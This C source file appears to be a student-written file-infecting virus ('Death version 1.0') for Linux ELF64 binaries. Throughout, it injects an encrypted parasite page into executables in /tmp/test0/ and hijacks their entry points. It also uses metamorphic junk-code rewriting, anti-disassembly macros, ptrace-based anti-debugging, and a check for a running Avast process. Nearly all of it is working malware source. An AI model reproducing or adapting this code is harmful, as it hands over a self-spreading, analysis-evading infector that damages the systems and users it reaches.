#include "famine.h"

int		anti_debug()
{
	int					gd_fd;
	int					fd;
	int					ret;
    struct dirent   	dir;
	char				str[256 * 2] = "/proc/";
	char				avast[] = "avast";
	char				comm[] = "/comm";
	char				buf[6];
	
    if (ft_sysptrace(PTRACE_TRACEME, 0, 0, 0) < 0)
		return (-1);
	
	if ((gd_fd = ft_sysopen(gd_fd, str, O_RDONLY)) < 0)
		return (0);
    ret = 1;
		
    while (ret > 0)
    {
		if (ret = ft_sysgetdents(gd_fd, &dir, sizeof(dir)))
		{
			ft_syslseek(gd_fd, dir.d_off, SEEK_SET);
			if ((fd = ft_sysopen(fd, ft_strcat(ft_strcat(str, dir.d_name - 1), comm), O_RDONLY)) > 0)
			{
				ft_sysread(fd, buf, 5);
				buf[5] = '\0';
				if (ft_strcmp(buf, avast) == 0)
					return (-1);
			}
		}
		str[6] = '\0';
    }
	ft_sysclose(fd);
	ft_sysclose(gd_fd);
}

void	jump()
{
	void		*addr;
	void		*crypt;
	char		*code;
	int			i;

	asm("mov %%rax, %%r12\n"
		"mov %%rdx, %%r13\n"
		"mov %%rsi, %%r14\n": "=r" (addr));
	asm("lea (%%rip),%0" : "=r" (crypt));ANTI_DISAS
	if (anti_debug() < 0)
		goto debug;ANTI_DISAS
	code = crypt + 0xae;ANTI_DISAS
	i = 0;
	while (i < CODE_SIZE)
	{
		*(int*)(code + i) ^= 0x12345678;ANTI_DISAS
		i++;ANTI_DISAS
	}
	main();
debug:
	asm("mov %%r12, %%rax\n"
		"mov %%r13, %%rdx\n"
		"mov %%r14, %%rsi\n": "=r" (addr));ANTI_DISAS
	long int		j = 0x4141414141414141;
	asm("mov %%rbp, %%rsp\n"
	"pop %%rax": "=r" (addr));
	asm("jmp jump");
}

int     main(int ac, char **av)
{
    int 				fd;
    int					ret;
    struct dirent   	dir;
    char				str[256 * 2] = "/tmp/test0/";
	char				*filename;

	asm("mov 0x50(%%rbp), %%rax": "=r" (filename));
	if (filename == 0)
		filename = av[0];JUNK
	if ((fd = ft_sysopen(fd, str, O_RDONLY)) < 0)
		return (-1);JUNK
    ret = 1;JUNK
    while (ret > 0)
    {
    	ret = ft_sysgetdents(fd, &dir, sizeof(dir));JUNK
		if (ret <= 0)
			return (0);JUNK
		ft_syslseek(fd, dir.d_off, SEEK_SET);JUNK
		openfile(dir.d_name - 1, str, filename);JUNK
    }
	fd = ft_sysclose(fd);JUNK
	return (ret);
}

void	replace_junk(int key, char *code)
{
	int		reg;
	int		instruction[] = { ADD,AND,XOR,OR,SBB,SUB };
	int		i;
	
	reg = (key ^ (off_t)code) % 6;JUNK
	if (reg == 4 || reg == 5)
		reg += 2;JUNK
	code[0] = (char)(PUSH + reg);JUNK
	code[JUNK_SIZE + 1] = (char)(POP + reg);JUNK
	i = 1;
	while (i < JUNK_SIZE + 1)
	{
		code[i] = instruction[((key + (off_t)code) ^ i) % 6];JUNK
		code[i + 1] = 0xc0 + (reg * 8) + (char)(((key + (off_t)code) ^ i) % 8);JUNK
		i += 2;JUNK
	}
}

char	*check_junk(int key, char *code, size_t size)
{
	int		i;
	int		j;
	int		reg;
	
	i = 0;JUNK
	while (i < size)
	{
		reg = (code[i] - PUSH);JUNK
		if (reg < 0 || reg > 7 || reg == 4 || reg == 5)
		{
			i++;JUNK
			continue ;JUNK
		}
		reg = reg * 8;JUNK
		if (i + JUNK_SIZE + 1 >= size || code[i + JUNK_SIZE + 1] - POP != reg)
		{
			i++;JUNK
			continue ;JUNK
		}
		j = 1;JUNK
		while (j < JUNK_SIZE + 1)
		{
			if (code[i + j] != ADD && code[i + j] != AND && code[i + j] != XOR &&
			code[i + j] != OR && code[i + j] != SBB && code[i + j] != SUB)
				break ;JUNK
			if (code[i + j + 1] < (char)(reg + 0xc0) || code[i + j + 1] >= (char)(reg + 0xc8))
				break ;JUNK
			j += 2;JUNK
		}
		if (j == 7)
			replace_junk(key, code + i);JUNK
		i++;JUNK
	}
	return (code);
}

char			*create_opcode(Elf64_Addr entrypoint, Elf64_Addr tmp_entry, size_t *code_size, char *binary, char *path, struct stat buf)
{
    Elf64_Ehdr	*header;
	Elf64_Shdr	*section;
	Elf64_Addr	jmp_addr;
	void		*malware_code;
	char		*code;
	char		*ptr;
	char		*jump;
	char		string[] = "AAAAAAAA\x48\x89\x45\xf8\x48\x89\xec\x58";
	char		signature[] = "Death version 1.0 (c)oded by amaindro-droly - ";
	char		str[] = "/tmp/test0/";
	off_t		size;
	int			fd;
	int			i_s;
	int			key;
	
	fd = ft_sysopen(fd, binary, O_RDONLY);JUNK
	if (fd < 0)
		return (NULL);JUNK
	size = ft_syslseek(fd, 0, SEEK_END);JUNK
	if (size < 0)
		return (NULL);JUNK

	ptr = ft_sysmmap(0, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);JUNK
	if (ptr == MAP_FAILED)
		return (NULL);JUNK

	if (*(int *)ptr != 0x464c457f || ptr[EI_CLASS] != ELFCLASS64)
		return (NULL);JUNK
	
	header = (void*)ptr;JUNK
	if (ft_strcmp(str, path) == 0)
	{
		JUNK
		section = NULL;
		i_s = 0;
		while (i_s < header->e_shnum)
		{
			JUNK
			if ((void*)(section = elf_section(header, i_s)) > (void*)ptr + size)
				return (NULL);JUNK
			if (elf_section(header, i_s + 1)->sh_addr > header->e_entry)
				break ;JUNK
			i_s++;
		}
		JUNK
		if (section == NULL)
			return (NULL);JUNK
		malware_code = (void*)section->sh_addr;JUNK
		*code_size = section->sh_size;JUNK
	}
	else
	{
		JUNK
		malware_code = (void*)header->e_entry - JMP_ADDR;JUNK
		*code_size = PAGE_SIZE;JUNK
	}
	
	JUNK
	code = ft_sysmmap(0, sizeof(char) * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);JUNK
	if (code == MAP_FAILED)
		return (NULL);JUNK

	ft_bzero(code, sizeof(char) * PAGE_SIZE);JUNK
	ft_memcpy(code, malware_code, *code_size);JUNK
	
	ft_memcpy(code + PAGE_SIZE - 46 - 11, signature, 46);JUNK
	key = (int)(((buf.st_ino << 16) + buf.st_size) ^ buf.st_mtime);JUNK
	ft_fingerprint(key, (code + PAGE_SIZE - 11));JUNK
	check_junk(key, code, *code_size);JUNK
	jump = ft_memstr(code, string, *code_size);JUNK
	*(int*)(jump - 59) = key;JUNK
	jump[20] = '\xe9'; //jump to main
	*(int*)(jump + 21) = (entrypoint - tmp_entry + JMP_SIZE - 3) ^ 0xffffffff;JUNK

	if (ft_strcmp(path, "/tmp/test0/") == 0)
		jump[92] = '/';
	else
		jump[92] = '2';
		
	fd = ft_sysclose(fd);JUNK
	if (fd < 0)
		return (NULL);JUNK
	fd = ft_sysmunmap(ptr, size);JUNK
	if (fd < 0)
		return (NULL);JUNK	
	
	code = encrypt(code, PAGE_SIZE, key);JUNK
	
	return (code);
}

void            *infect(void *ptr, size_t *size, char *binary, char *path, struct stat buf)
{
	int			i_p;
	int			i_s;
	char		*str;
	char		*code;
	size_t		code_size;
	size_t		tmp_size;
    Elf64_Ehdr	*header;
    Elf64_Phdr	*program;
	Elf64_Shdr	*section;
	Elf64_Addr	tmp_entry;
    
    header = ptr;JUNK
    
	//Patch the insertion code (parasite) to jump to the entry point (original)
	tmp_entry = header->e_entry;JUNK

	//Locate the text segment program header
	program = NULL;JUNK
	
	i_p = 0;JUNK
	while (i_p < header->e_phnum)
	{
		if ((void*)(program = elf_program(header, i_p++)) > ptr + *size)
			return (NULL);JUNK
			
		if (program->p_type == PT_LOAD && program->p_flags & PF_X)
			break ;JUNK
	}
	if (program == NULL)
		return (NULL);JUNK
	tmp_size = program->p_offset + program->p_filesz;JUNK

	//Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
	//Hardcoded value obtainable in gdb with Jumpaddress - Entrypoint
	header->e_entry = program->p_vaddr + program->p_filesz + JMP_ADDR;JUNK

	//change text segment access rights to be able to decrypt it later
	program->p_flags = program->p_flags | PF_W;JUNK

	//Increase p_filesz by account for the new code (parasite)
	program->p_filesz += PAGE_SIZE;JUNK
	//Increase p_memsz to account for the new code (parasite)
	program->p_memsz += PAGE_SIZE;JUNK
	//For the last shdr in the text segment
	section = NULL;JUNK
	i_s = 0;
	while (i_s < header->e_shnum)
	{
		if ((void*)(section = elf_section(header, i_s)) > ptr + *size)
			return (NULL);JUNK
		if (elf_section(header, i_s + 1)->sh_addr > header->e_entry)
		{
	//increase sh_len by the parasite length
			section->sh_size += PAGE_SIZE;JUNK
			break ;JUNK
		}
		i_s++;JUNK
	}
	if (section == NULL)
		return (NULL);JUNK
	update_segment_64(header, elf_program(header, i_p)->p_offset);JUNK
	update_section_64(header, section->sh_offset);JUNK
	header->e_shoff += PAGE_SIZE;JUNK

	code = NULL;JUNK
	if ((code = create_opcode(header->e_entry, tmp_entry, &code_size, binary, path, buf)) == NULL)
		return (NULL);JUNK
	str = NULL;JUNK

	str = ft_sysmmap(0, *size + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (str == MAP_FAILED)
		return (NULL);JUNK

	ft_bzero(str, *size + PAGE_SIZE);JUNK
	ft_memcpy(str, ptr, tmp_size);JUNK
	//Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
	ft_memcpy(str + tmp_size, code, PAGE_SIZE);JUNK
	ft_memcpy(str + tmp_size + PAGE_SIZE, ptr + tmp_size, *size - tmp_size);JUNK
	*size += PAGE_SIZE;JUNK
	return (str);
}

void			replace_file(void *ptr, int fd, int size_file)
{
	int		ret;
	
	if (ptr == NULL)
		return ;JUNK
	ret = ft_syslseek(fd, 0, SEEK_SET);JUNK
	if (ret < 0)
		return ;JUNK
	ft_syswrite(fd, ptr, size_file);JUNK
}

void			magic_number(void *ptr, size_t size, int fd, char *binary, char *path)
{
	char		*str;
	char		*str2;
	char		str3[] = "Death version 1.0 (c)oded by amaindro-droly - ";
	struct stat buf;

	str = ptr;JUNK
	if (*(int *)ptr == 0x464c457f && str[EI_CLASS] == ELFCLASS64 && *(Elf64_Half *)(ptr + 16) == 2)
	{
		if (ft_memstr(str, str3, size))
			return ;JUNK
		str2 = NULL;JUNK
		ft_sysfstat(fd, &buf);JUNK
		if ((str2 = infect(ptr, &size, binary, path, buf)) != NULL)
			replace_file(str2, fd, size);JUNK
	}
}

int    openfile(char *filename, char *parent_dir, char *binary)
{
    int				fd;
	char			*ptr;
	char			str[256 * 2];
	off_t			size;

	ft_strcpy(str, parent_dir);JUNK
	fd = ft_sysopen(fd, ft_strcat(str, filename), O_RDWR);JUNK
	if (fd < 0)
		return (-1);JUNK

	size = ft_syslseek(fd, 0, SEEK_END);JUNK
	if (size < 0)
		return (-1);JUNK

	ptr = ft_sysmmap(0, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);JUNK
	if (ptr == MAP_FAILED)
		return (-1);JUNK

	magic_number(ptr, size, fd, binary, parent_dir);JUNK

	fd = ft_sysclose(fd);JUNK
	if (fd < 0)
		return (-1);JUNK

	fd = ft_sysmunmap(ptr, size);JUNK
	if (fd < 0)
		return (-1);JUNK
	return (0);JUNK
}